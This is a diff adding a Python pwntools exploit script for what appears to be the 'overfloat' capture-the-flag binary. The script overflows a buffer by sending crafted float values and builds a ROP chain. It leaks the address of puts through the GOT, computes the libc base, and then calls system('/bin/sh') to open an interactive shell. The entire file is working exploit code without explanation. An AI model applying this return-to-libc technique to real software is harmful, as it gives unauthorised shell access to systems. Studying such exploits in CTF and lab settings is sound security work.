@@ -1,0 +1,76 @@
+#!/usr/bin/env python3
+import pwn
+import struct
+
+libc = pwn.ELF("./libc-2.27.so", checksec=False)
+elf = pwn.ELF("./overfloat_patched", checksec=False)
+rop = pwn.ROP("./overfloat_patched", checksec=False)
+io = pwn.process("./overfloat_patched")
+
+offset = 56
+
+puts_plt = elf.plt["puts"]
+puts_got = elf.got["puts"]
+# pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+pop_rdi = 0x0000000000400a83
+ret = rop.find_gadget(['ret'])[0]
+main = elf.symbols["main"]
+
+print("puts plt",hex(puts_plt))
+print("puts got",hex(puts_got))
+print("pop rdi",hex(pop_rdi))
+print("ret ",hex(ret))
+print("main",hex(main))
+
+
+def pf(num: int):
+    return struct.pack("f", num)
+
+
+def uf(byte: bytes):
+    return struct.unpack("f", byte)[0]
+
+
+def send(x: int):
+    p1 = (x & 0xFFFFFFFF).to_bytes(4, "little")
+    p2 = (x >> 32).to_bytes(4, "little")
+
+    io.sendline(str(uf(p1)).encode())
+    io.sendline(str(uf(p2)).encode())
+
+
+def leak():
+    for i in range(7):
+        send(0xDEADBEEFDEADBEEF)
+
+    send(pop_rdi)
+    send(puts_got)
+    send(puts_plt)
+    send(main)
+    io.sendline(b"done")
+    io.recvuntil(b"BON VOYAGE!\n")
+
+    leak = io.recvline().rstrip()
+    leak = leak + (8 - len(leak)) * b"\x00"
+    leak = struct.unpack("Q", leak)[0]
+
+    base = leak - libc.symbols["puts"]
+    libc.address = base
+
+    print("base: ", hex(base))
+
+
+def exploit():
+    for i in range(7):
+        send(0xDEADBEEFDEADBEEF)
+
+    send(pop_rdi)
+    send(next(libc.search(b"/bin/sh")))
+    send(ret)
+    send(libc.symbols["system"])
+
+    io.sendline(b"done")
+
+leak()
+exploit()
+io.interactive()
